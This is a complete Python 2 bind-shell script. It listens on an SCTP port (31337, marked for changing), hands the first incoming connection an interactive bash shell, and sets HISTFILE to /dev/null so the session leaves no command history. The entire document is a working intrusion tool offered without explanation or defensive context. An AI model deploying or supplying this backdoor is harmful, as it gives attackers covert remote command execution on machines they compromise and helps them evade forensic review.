#!/usr/bin/python2
import os
import pty
import socket
from sctp import *

lport = 31337 # XXX: CHANGEME

def main():
    s = sctpsocket_tcp(socket.AF_INET)
    s.bind(('', lport))
    s.listen(1)
    (rem, addr) = s.accept()
    os.dup2(rem.fileno(),0)
    os.dup2(rem.fileno(),1)
    os.dup2(rem.fileno(),2)
    os.putenv("HISTFILE",'/dev/null')
    pty.spawn("/bin/bash")
    s.close()
	
if __name__ == "__main__":
    main()
